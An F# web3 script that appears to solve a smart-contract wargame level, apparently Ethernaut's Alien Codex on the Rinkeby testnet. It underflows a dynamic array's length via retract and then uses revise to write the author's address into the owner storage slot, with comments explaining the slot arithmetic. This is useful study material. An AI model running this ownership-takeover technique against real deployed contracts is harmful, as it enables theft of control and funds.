#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env = createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// my instance: 0x5A48c7bbf0150DCA1aA507C3563d67B8fD67DB23

let codexABI = """[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"constant":true,"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"codex","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"contact","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"make_contact","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"bytes32","name":"_content","type":"bytes32"}],"name":"record","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"retract","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"i","type":"uint256"},{"internalType":"bytes32","name":"_content","type":"bytes32"}],"name":"revise","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]""" |> ABI
let codex = loadDeployedContract env "0x5A48c7bbf0150DCA1aA507C3563d67B8fD67DB23" RINKEBY codexABI |> bindDeployedContract |> List.head

// current owner
call codex (ByString "owner") []
|> env.log Log

// [+] Call result: [Address "0xda5b3fb76c78b6edee6be8f11a1c31ecfb02b272"]

// make contact
txn codex (ByString "make_contact") [] ZEROV
|> env.log Log

// retract the array to underflow
txn codex (ByString "retract") [] ZEROV
|> env.log Log

// The idea here is that, now that the size of the array is essentially covering the entire storage space of the contract, 
// the arbitrary write tool provided by 'revise' allows us to overwrite the value of owner. 

// When a contract's storage is used, static values (simple values and statically-sized arrays) are co-located, sequentially.
// However, dynamic values (much like the ABI representation) store an offset, and then put the bulk of their values
// elsewhere. However, the base value, where the offset is stored, is deterministic. By subtracting the location in the 
// 256 bit storage space of the array 'stub' from the maximum value, you land at the first 'key' or statically-stored
// value. Because the Ownable contract gets first dibs on storage slots (because of the import order), 'owner' will be
// located at the first slot. The 'payload' is just the bytes32 representation of an address. Just put the 0's in the 
// right place and it will be interpreted as a uint160 (address)

// 256max - 80084422859880547211683076133703299733277748156566366325829078699459944778998 = 
// 35707666377435648211887908874984608119992236509074197713628505308453184860938

txn codex (ByString "revise") [Uint256 "35707666377435648211887908874984608119992236509074197713628505308453184860938"; BytesSz "0x0000000000000000000000002268b96e204379ee8366505c344ebe5cc34d3a46"] ZEROV
|> env.log Log

// check owner
call codex (ByString "owner") []
|> env.log Log
